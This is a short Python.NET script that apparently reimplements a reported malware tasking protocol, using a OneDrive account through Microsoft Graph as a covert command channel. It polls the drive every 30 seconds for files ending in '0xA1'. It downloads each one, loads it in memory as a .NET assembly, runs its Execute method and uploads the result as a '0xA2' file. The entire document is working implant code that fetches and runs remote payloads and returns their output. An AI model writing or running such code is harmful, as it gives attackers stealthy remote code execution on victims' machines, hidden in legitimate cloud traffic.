import json
import sys
import time
import urllib.request
import clr
from System import Array, Object, String
from System.Reflection import Assembly

# Python.NET variant of the reported cloud-file assembly tasking protocol.
root = "https://graph.microsoft.com/v1.0/me/drive"
auth = {"Authorization": "Bearer " + sys.argv[1]}
while True:
    listing = json.load(urllib.request.urlopen(urllib.request.Request(root + "/root/children", headers=auth)))
    for entry in listing["value"]:
        if entry["name"].endswith("0xA1"):
            task_url = root + "/items/" + entry["id"] + "/content"
            reply_value = Assembly.Load(bytearray(urllib.request.urlopen(urllib.request.Request(task_url, headers=auth)).read())).GetType("Extensions.Entry").GetMethod("Execute").Invoke(None, Array[Object]([Array[String]([])]))
            request = urllib.request.Request(root + "/root:/" + entry["name"][:-4] + "0xA2:/content", data=str(reply_value).encode(), headers=auth, method="PUT")
            urllib.request.urlopen(request).close()
    time.sleep(30)
